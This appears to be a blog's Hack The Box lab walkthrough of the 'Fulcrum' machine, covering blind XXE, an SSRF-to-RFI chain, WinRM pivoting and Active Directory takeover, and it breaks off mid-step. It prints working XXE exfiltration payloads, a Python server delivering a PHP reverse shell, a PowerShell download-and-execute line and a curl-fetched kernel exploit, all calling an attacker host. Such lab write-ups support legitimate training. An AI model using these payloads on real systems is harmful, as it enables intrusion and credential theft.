<!doctype html><html lang=en><head><title>Fulcrum HTB - Insane Linux Box Walkthrough :: VAPT Walkthroughs</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Complete walkthrough of Fulcrum HTB machine featuring blind XXE exploitation, SSRF to RFI chain, Active Directory enumeration, WinRM pivoting, PowerShell credential decryption, and kernel exploitation with VMDK file extraction"><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=https://malayamanas.github.io/posts/fulcrum-htb-walkthrough/><link rel=stylesheet href=https://malayamanas.github.io/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css><link rel=stylesheet href=https://malayamanas.github.io/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css><link rel=stylesheet href=https://malayamanas.github.io/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css><link rel=stylesheet href=https://malayamanas.github.io/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css><link rel=stylesheet href=https://malayamanas.github.io/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css><link rel=stylesheet href=https://malayamanas.github.io/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css><link rel=stylesheet href=https://malayamanas.github.io/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css><link rel=stylesheet href=https://malayamanas.github.io/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css><link rel=stylesheet href=https://malayamanas.github.io/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css><link rel=stylesheet href=https://malayamanas.github.io/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css><link rel=stylesheet href=https://malayamanas.github.io/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css><link rel=stylesheet href=https://malayamanas.github.io/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css><link rel=stylesheet href=https://malayamanas.github.io/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css><link rel=stylesheet href=https://malayamanas.github.io/terminal.css><link rel="shortcut icon" href=https://malayamanas.github.io/favicon.png><link rel=apple-touch-icon href=https://malayamanas.github.io/apple-touch-icon.png><meta name=twitter:card content="summary"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Fulcrum HTB - Insane Linux Box Walkthrough"><meta property="og:description" content="Complete walkthrough of Fulcrum HTB machine featuring blind XXE exploitation, SSRF to RFI chain, Active Directory enumeration, WinRM pivoting, PowerShell credential decryption, and kernel exploitation with VMDK file extraction"><meta property="og:url" content="https://malayamanas.github.io/posts/fulcrum-htb-walkthrough/"><meta property="og:site_name" content="VAPT Walkthroughs"><meta property="og:image" content="https://malayamanas.github.io/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:section" content="HTB"><meta property="article:section" content="Linux"><meta property="article:published_time" content="2025-09-22 10:00:00 +0000 UTC"></head><body><div class=container><header class=header><div class=header__inner><div class=header__logo><a href=https://malayamanas.github.io/><div class=logo>Terminal</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;â–¾</li><li><ul class=menu__dropdown><li><a href=/>Home</a></li><li><a href=/search>Search</a></li><li><a href=/tags>Tags</a></li><li><a href=/difficulty>Difficulty</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/>Home</a></li><li><a href=/search>Search</a></li><li><a href=/tags>Tags</a></li><li><a href=/difficulty>Difficulty</a></li></ul></nav></header><div class=content><article class=post><h1 class=post-title><a href=https://malayamanas.github.io/posts/fulcrum-htb-walkthrough/>Fulcrum HTB - Insane Linux Box Walkthrough</a></h1><div class=post-meta><time class=post-date>2025-09-22</time></div><span class=post-tags>#<a href=https://malayamanas.github.io/tags/insane-linux/>insane-linux</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/xxe/>xxe</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/ssrf/>ssrf</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/rfi/>rfi</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/active-directory/>active-directory</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/winrm/>winrm</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/powershell/>powershell</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/vmware/>vmware</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/kernel-exploit/>kernel-exploit</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/privilege-escalation/>privilege-escalation</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/domain-admin/>domain-admin</a>&nbsp;</span><div class=post-content><div><h1 id=fulcrum-htb---insane-linux-box-walkthrough>Fulcrum HTB - Insane Linux Box Walkthrough<a href=#fulcrum-htb---insane-linux-box-walkthrough class=hanchor arialabel=Anchor>#</a></h1><div style=position:relative;padding-bottom:56.25%;height:0;overflow:hidden><iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading=eager referrerpolicy=strict-origin-when-cross-origin src="https://www.youtube.com/embed/46RJxJ-Fm0Y?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style=position:absolute;top:0;left:0;width:100%;height:100%;border:0 title="YouTube video"></iframe></div><h2 id=key-exploitation-steps-and-techniques>Key Exploitation Steps and Techniques<a href=#key-exploitation-steps-and-techniques class=hanchor arialabel=Anchor>#</a></h2><p>The following is a chronological breakdown of the key exploitation steps and techniques used to compromise the &ldquo;Fulcrum&rdquo; machine from Hack The Box, as described in the provided data. The steps are derived from the detailed walkthrough and organized to reflect the sequence of actions taken to achieve initial access, privilege escalation, and full compromise of the target system.</p><hr><h3 id=1-initial-reconnaissance>1. Initial Reconnaissance<a href=#1-initial-reconnaissance class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Network scanning with Nmap</li><li><strong>Details</strong>:<ul><li>Performed an Nmap scan (<code>nmap -sC -sV -oA nmap/initial [TARGET-IP]</code>) to identify open ports and services on the target IP ([TARGET-IP]).</li><li>Identified services:<ul><li>Port 80: Nginx 1.10.3 (Ubuntu), displaying a Microsoft .NET error (indicating a potential misconfiguration or rabbit hole).</li><li>Port 88: PHPMyAdmin (authentication attempt failed, likely locked or misconfigured).</li><li>Port 9001: pfSense interface (default credentials <code>admin:pfSense</code> failed due to lockout mechanism).</li><li>Port 9999: Unique server header &ldquo;Fulcrum API beta,&rdquo; suggesting a custom API.</li><li>Confirmed the system as Ubuntu (likely Xenial 16.04) based on OpenSSH 7.2p2 banner.</li></ul></li><li>Conducted a second Nmap scan (<code>nmap -p- [TARGET-IP]</code>) to enumerate all ports, revealing port 56423 (unidentified service).</li></ul></li></ul><hr><h3 id=2-web-enumeration>2. Web Enumeration<a href=#2-web-enumeration class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Manual web enumeration and file discovery</li><li><strong>Details</strong>:<ul><li>Visited <code>http://[TARGET-IP]:80</code>, which showed an &ldquo;under maintenance&rdquo; page with a Microsoft .NET error (despite Nginx/Ubuntu server, indicating a misconfiguration).</li><li>Identified PHP files: <code>index.php</code>, <code>home.php</code>, and <code>upload.php</code> by manually testing URLs (e.g., <code>http://[TARGET-IP]/home.php</code>).</li><li>Attempted file upload via <code>upload.php</code>, which failed, suggesting validation checks (not an image upload vulnerability).</li><li>Noted the PHP application uses an include statement appending <code>.php</code> to parameters (e.g., <code>index.php?page=home</code> loads <code>home.php</code>).</li></ul></li></ul><hr><h3 id=3-xml-external-entity-xxe-injection-blind>3. XML External Entity (XXE) Injection (Blind)<a href=#3-xml-external-entity-xxe-injection-blind class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Blind XXE via API endpoint on port 9999</li><li><strong>Details</strong>:<ul><li>Targeted the API endpoint on port 9999 (<code>http://[TARGET-IP]:9999</code>), which responded differently to XML input compared to plain text or JSON.</li><li>Tested for XXE by sending an XML payload to trigger an HTTP request to the attacker&rsquo;s server ([ATTACKER-IP]:9001):<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY xxe SYSTEM &#34;http://[ATTACKER-IP]:9001/please_subscribe&#34;&gt;</span> ]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;foo&gt;</span>&amp;xxe;<span style=color:#f92672>&lt;/foo&gt;</span>
</span></span></code></pre></div></li><li>Confirmed XXE vulnerability when the target server made a request to the attacker&rsquo;s server, proving blind out-of-band interaction.</li><li>Used a transform file (<code>transform.xml</code>) to read files from the server:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY % data SYSTEM &#34;php://filter/convert.base64-encode/resource=/etc/passwd&#34;&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!ENTITY % param1 &#34;&lt;!ENTITY xxe SYSTEM &#39;http://[ATTACKER-IP]:9001/stage2.xml?%data;&#39;&gt;</span>&#34;&gt;
</span></span></code></pre></div></li><li>Received base64-encoded file contents (e.g., <code>/etc/passwd</code>) via HTTP requests to the attacker&rsquo;s server, decoded using <code>base64 -d</code>.</li></ul></li></ul><hr><h3 id=4-automating-xxe-exploitation>4. Automating XXE Exploitation<a href=#4-automating-xxe-exploitation class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Python HTTP server for dynamic XXE file retrieval</li><li><strong>Details</strong>:<ul><li>Created a Python script (<code>xxe.py</code>) to automate file retrieval via XXE:<ul><li>Listened on port 9001 to handle requests from the target server.</li><li>Handled two stages:<ul><li><strong>Stage 1</strong>: Served a transform file (<code>stage1.xml</code>) to initiate file read requests.</li><li><strong>Stage 2</strong>: Received and decoded base64-encoded file contents from the server.</li></ul></li><li>Script logic:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> http.server <span style=color:#f92672>import</span> BaseHTTPRequestHandler, HTTPServer
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> base64 <span style=color:#f92672>import</span> b64decode
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>HTTPRequestHandler</span>(BaseHTTPRequestHandler):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>do_GET</span>(self):
</span></span><span style=display:flex><span>        stage, data <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;?&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> stage <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;/stage1.xml&#39;</span>:
</span></span><span style=display:flex><span>            message <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;!ENTITY </span><span style=color:#e6db74>% d</span><span style=color:#e6db74>ata SYSTEM &#34;php://filter/convert.base64-encode/resource=</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;!ENTITY % param1 &#34;&lt;!ENTITY xxe SYSTEM &#39;http://[ATTACKER-IP]:9001/stage2.xml?</span><span style=color:#e6db74>%d</span><span style=color:#e6db74>ata;&#39;&gt;&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &#34;&#34;&#34;</span><span style=color:#f92672>.</span>format(data)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>elif</span> stage <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;/stage2.xml&#39;</span>:
</span></span><span style=display:flex><span>            message <span style=color:#f92672>=</span> b64decode(data)<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)
</span></span><span style=display:flex><span>            print(message)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>            message <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;send me shells&#34;</span>
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>send_response(<span style=color:#ae81ff>200</span>)
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>end_headers()
</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>wfile<span style=color:#f92672>.</span>write(bytes(message, <span style=color:#e6db74>&#39;utf-8&#39;</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>server_address <span style=color:#f92672>=</span> (<span style=color:#e6db74>&#39;&#39;</span>, <span style=color:#ae81ff>9001</span>)
</span></span><span style=display:flex><span>httpd <span style=color:#f92672>=</span> HTTPServer(server_address, HTTPRequestHandler)
</span></span><span style=display:flex><span>httpd<span style=color:#f92672>.</span>serve_forever()
</span></span></code></pre></div></li></ul></li><li>Successfully retrieved files like <code>/etc/os-release</code> to confirm Ubuntu Xenial 16.04.</li></ul></li></ul><hr><h3 id=5-server-side-request-forgery-ssrf-to-remote-file-inclusion-rfi>5. Server-Side Request Forgery (SSRF) to Remote File Inclusion (RFI)<a href=#5-server-side-request-forgery-ssrf-to-remote-file-inclusion-rfi class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Chaining XXE to SSRF for RFI</li><li><strong>Details</strong>:<ul><li>Modified the XXE payload to force the server to make requests to <code>http://127.0.0.1:80/index.php?page=http://[ATTACKER-IP]:9002/test</code>, attempting to trigger RFI.</li><li>Confirmed the server fetched the attacker&rsquo;s URL, indicating SSRF.</li><li>Hosted a malicious PHP reverse shell (<code>shell.php</code>) on the attacker&rsquo;s server ([ATTACKER-IP]:9002), based on a modified PentestMonkey PHP reverse shell.</li><li>Updated the Python script to serve the PHP shell when requested:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>    stage, data <span style=color:#f92672>=</span> self<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;?&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> stage <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;/stage1.xml&#39;</span>:
</span></span><span style=display:flex><span>        message <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;!ENTITY </span><span style=color:#e6db74>% d</span><span style=color:#e6db74>ata SYSTEM &#34;php://filter/convert.base64-encode/resource=</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;!ENTITY % param1 &#34;&lt;!ENTITY xxe SYSTEM &#39;http://[ATTACKER-IP]:9001/stage2.xml?</span><span style=color:#e6db74>%d</span><span style=color:#e6db74>ata;&#39;&gt;&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &#34;&#34;&#34;</span><span style=color:#f92672>.</span>format(data)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>elif</span> stage <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;/stage2.xml&#39;</span>:
</span></span><span style=display:flex><span>        message <span style=color:#f92672>=</span> b64decode(data)<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)
</span></span><span style=display:flex><span>        print(message)
</span></span><span style=display:flex><span><span style=color:#66d9ef>except</span>:
</span></span><span style=display:flex><span>    message <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;&lt;?php
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    // PHP reverse shell code (PentestMonkey)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    set_time_limit(0);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    $ip = &#39;[ATTACKER-IP]&#39;;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    $port = 9002;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    $sock = fsockopen($ip, $port);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    $proc = proc_open(&#39;/bin/sh&#39;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock), $pipes);
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    ?&gt;&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>self<span style=color:#f92672>.</span>send_response(<span style=color:#ae81ff>200</span>)
</span></span><span style=display:flex><span>self<span style=color:#f92672>.</span>end_headers()
</span></span><span style=display:flex><span>self<span style=color:#f92672>.</span>wfile<span style=color:#f92672>.</span>write(bytes(message, <span style=color:#e6db74>&#39;utf-8&#39;</span>))
</span></span></code></pre></div></li><li>Triggered the RFI by sending an XXE payload to include the malicious PHP file, resulting in a reverse shell as the <code>www-data</code> user on the Fulcrum server (<code>whoami: www-data</code>).</li></ul></li></ul><hr><h3 id=6-post-exploitation-enumeration>6. Post-Exploitation Enumeration<a href=#6-post-exploitation-enumeration class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: File system and network enumeration</li><li><strong>Details</strong>:<ul><li>Navigated the file system as <code>www-data</code>:<ul><li>Found a PowerShell script (<code>fulcrum_upload_core.ps1</code>) in <code>/var/www/uploads</code> containing an encrypted password and decryption key.</li><li>Identified virtual machine (VM) infrastructure in <code>/var/lib/libvirt/images</code>, including VMDK files for a domain controller (<code>dc.vmdk</code>) and file server.</li></ul></li><li>Ran <code>linpeas.sh</code> to enumerate system details, confirming:<ul><li>User <code>blueprint</code> with accessible directories.</li><li>Multiple network interfaces (e.g., <code>192.168.122.1</code>, <code>192.168.122.28</code>) and VMs running on the hypervisor.</li><li>Processes indicating a virtualized environment (<code>libvirt</code>, <code>web</code>, <code>dc</code>, <code>file</code>).</li></ul></li></ul></li></ul><hr><h3 id=7-decrypting-powershell-secure-string>7. Decrypting PowerShell Secure String<a href=#7-decrypting-powershell-secure-string class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: PowerShell secure string decryption</li><li><strong>Details</strong>:<ul><li>Decrypted the secure string in <code>fulcrum_upload_core.ps1</code> using PowerShell on the attacker&rsquo;s Kali box:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$secureString = ConvertTo-SecureString <span style=color:#e6db74>&#34;encrypted_password&#34;</span> -Key (key_from_script)
</span></span><span style=display:flex><span>$credential = New-Object System.Management.Automation.PSCredential(<span style=color:#e6db74>&#34;web_user&#34;</span>, $secureString)
</span></span><span style=display:flex><span>$password = $credential.GetNetworkCredential().Password
</span></span></code></pre></div></li><li>Obtained the password <code>management_pass</code> for the <code>web_user</code> account.</li><li>Noted PowerShell crashes due to telemetry issues, mitigated by setting <code>$env:POWERSHELL_TELEMETRY_OPTOUT=1</code>.</li></ul></li></ul><hr><h3 id=8-pivoting-to-windows-machine-web-server>8. Pivoting to Windows Machine (Web Server)<a href=#8-pivoting-to-windows-machine-web-server class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Windows Remote Management (WinRM) via Ruby script</li><li><strong>Details</strong>:<ul><li>Identified WinRM service on <code>192.168.122.28:5986</code> (encrypted) using a static Nmap binary uploaded to the Fulcrum server.</li><li>Set up an SSH reverse tunnel to access the internal network:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ssh -R 5986:192.168.122.28:5986 ifsec@<span style=color:#f92672>[</span>ATTACKER-IP<span style=color:#f92672>]</span> -N
</span></span></code></pre></div></li><li>Used a Ruby WinRM script (<code>winrm_shell.rb</code>) from a GitHub repository to connect to the web server:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ruby data-lang=ruby><span style=display:flex><span>require <span style=color:#e6db74>&#39;winrm&#39;</span>
</span></span><span style=display:flex><span>conn <span style=color:#f92672>=</span> <span style=color:#66d9ef>WinRM</span><span style=color:#f92672>::</span><span style=color:#66d9ef>Connection</span><span style=color:#f92672>.</span>new(
</span></span><span style=display:flex><span>  <span style=color:#e6db74>endpoint</span>: <span style=color:#e6db74>&#39;http://127.0.0.1:5986/wsman&#39;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>user</span>: <span style=color:#e6db74>&#39;web_user&#39;</span>,
</span></span><span style=display:flex><span>  <span style=color:#e6db74>password</span>: <span style=color:#e6db74>&#39;management_pass&#39;</span>
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>conn<span style=color:#f92672>.</span>shell(<span style=color:#e6db74>:powershell</span>) <span style=color:#66d9ef>do</span> <span style=color:#f92672>|</span>shell<span style=color:#f92672>|</span>
</span></span><span style=display:flex><span>  output <span style=color:#f92672>=</span> shell<span style=color:#f92672>.</span>run(<span style=color:#e6db74>&#39;whoami&#39;</span>) { <span style=color:#f92672>|</span>stdout, stderr<span style=color:#f92672>|</span> puts stdout }
</span></span><span style=display:flex><span><span style=color:#66d9ef>end</span>
</span></span></code></pre></div></li><li>Gained access to the Windows web server as <code>web_user</code>.</li></ul></li></ul><hr><h3 id=9-active-directory-enumeration>9. Active Directory Enumeration<a href=#9-active-directory-enumeration class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: LDAP enumeration with PowerView</li><li><strong>Details</strong>:<ul><li>Found credentials in <code>web.config</code> (<code>c:\inetpub\wwwroot\web.config</code>): <code>ldap</code> user with password <code>password_for_searching</code> for <code>fulcrum.local</code> domain.</li><li>Uploaded PowerView (<code>PowerView.ps1</code>) to the web server via WinRM file upload.</li><li>Created credentials for LDAP queries:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$secPass = ConvertTo-SecureString <span style=color:#e6db74>&#34;password_for_searching&#34;</span> -AsPlainText -Force
</span></span><span style=display:flex><span>$cred = New-Object System.Management.Automation.PSCredential(<span style=color:#e6db74>&#34;fulcrum\ldap&#34;</span>, $secPass)
</span></span></code></pre></div></li><li>Ran PowerView to enumerate domain users:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>Import-Module .\PowerView.ps1
</span></span><span style=display:flex><span>Get-DomainUser -Credential $cred -DomainController dc.fulcrum.local | Select samaccountname, logoncount, lastlogon
</span></span></code></pre></div></li><li>Identified active accounts, including <code>btables</code> (logon count 29, password <code>fileserverlogin12345</code>) and <code>923a</code>.</li></ul></li></ul><hr><h3 id=10-accessing-the-file-server>10. Accessing the File Server<a href=#10-accessing-the-file-server class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: WinRM with credentials</li><li><strong>Details</strong>:<ul><li>Used <code>btables</code> credentials (<code>fulcrum\btables:fileserverlogin12345</code>) to access the file server (<code>file.fulcrum.local</code>):<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$secPass = ConvertTo-SecureString <span style=color:#e6db74>&#34;fileserverlogin12345&#34;</span> -AsPlainText -Force
</span></span><span style=display:flex><span>$cred = New-Object System.Management.Automation.PSCredential(<span style=color:#e6db74>&#34;fulcrum\btables&#34;</span>, $secPass)
</span></span><span style=display:flex><span>Invoke-Command -ComputerName file.fulcrum.local -Credential $cred -ScriptBlock { whoami }
</span></span></code></pre></div></li><li>Attempted a reverse shell using a PowerShell one-liner (<code>invoke-conPtyShell.ps1</code>) on port 53 (DNS, as it was open):<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>Invoke-Command -ComputerName file.fulcrum.local -Credential $cred -ScriptBlock {
</span></span><span style=display:flex><span>    Iwr http<span style=color:#960050;background-color:#1e0010>:</span>//[ATTACKER-IP]<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>80</span>/invoke-conPtyShell.ps1 | iex
</span></span><span style=display:flex><span>}
</span></span></code></pre></div></li><li>Successfully obtained a shell on the file server as <code>btables</code>.</li></ul></li></ul><hr><h3 id=11-enumerating-file-server-for-credentials>11. Enumerating File Server for Credentials<a href=#11-enumerating-file-server-for-credentials class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Accessing Netlogon scripts</li><li><strong>Details</strong>:<ul><li>Mounted the Netlogon share: <code>net use z: \\dc.fulcrum.local\netlogon /user:fulcrum\btables fileserverlogin12345</code>.</li><li>Found PowerShell scripts in the Netlogon share containing credentials.</li><li>Identified credentials for <code>923a</code> (password: <code>923a</code>) in a script using:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>Get-ChildItem *.ps1 | Select-String <span style=color:#e6db74>&#34;923a&#34;</span> | Select-Object -Unique
</span></span></code></pre></div></li></ul></li></ul><hr><h3 id=12-accessing-the-domain-controller>12. Accessing the Domain Controller<a href=#12-accessing-the-domain-controller class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Chaining Invoke-Command for double-hop</li><li><strong>Details</strong>:<ul><li>Used <code>923a</code> credentials (<code>fulcrum\923a:923a</code>) to access the domain controller (<code>dc.fulcrum.local</code>):<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$secPassBtables = ConvertTo-SecureString <span style=color:#e6db74>&#34;fileserverlogin12345&#34;</span> -AsPlainText -Force
</span></span><span style=display:flex><span>$credBtables = New-Object System.Management.Automation.PSCredential(<span style=color:#e6db74>&#34;fulcrum\btables&#34;</span>, $secPassBtables)
</span></span><span style=display:flex><span>$secPass923a = ConvertTo-SecureString <span style=color:#e6db74>&#34;923a&#34;</span> -AsPlainText -Force
</span></span><span style=display:flex><span>$cred923a = New-Object System.Management.Automation.PSCredential(<span style=color:#e6db74>&#34;fulcrum\923a&#34;</span>, $secPass923a)
</span></span><span style=display:flex><span>Invoke-Command -ComputerName file.fulcrum.local -Credential $credBtables -ScriptBlock {
</span></span><span style=display:flex><span>    Invoke-Command -ComputerName dc.fulcrum.local -Credential $args[<span style=color:#ae81ff>0</span>] -ScriptBlock { whoami }
</span></span><span style=display:flex><span>} -ArgumentList $cred923a
</span></span></code></pre></div></li><li>Confirmed domain admin access on <code>dc.fulcrum.local</code> and located <code>root.txt</code>.</li></ul></li></ul><hr><h3 id=13-unintended-privilege-escalation-alternative-path>13. Unintended Privilege Escalation (Alternative Path)<a href=#13-unintended-privilege-escalation-alternative-path class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Kernel exploit for local privilege escalation</li><li><strong>Details</strong>:<ul><li>Used <code>linpeas.sh</code> to identify potential kernel vulnerabilities on the Fulcrum server (Ubuntu Xenial 16.04).</li><li>Found and compiled an exploit (<code>exploit.c</code>) from a GitHub repository for Ubuntu 16.04 privilege escalation:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>curl http://<span style=color:#f92672>[</span>ATTACKER-IP<span style=color:#f92672>]</span>:80/exploit.c &gt; exploit.c
</span></span><span style=display:flex><span>gcc exploit.c -o exploit
</span></span><span style=display:flex><span>chmod +x exploit
</span></span><span style=display:flex><span>./exploit
</span></span></code></pre></div></li><li>Achieved root access on the Fulcrum server.</li><li>Mounted VMDK files to extract flags:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>modprobe nbd
</span></span><span style=display:flex><span>qemu-nbd -r -c /dev/nbd1 /var/lib/libvirt/images/dc.vmdk
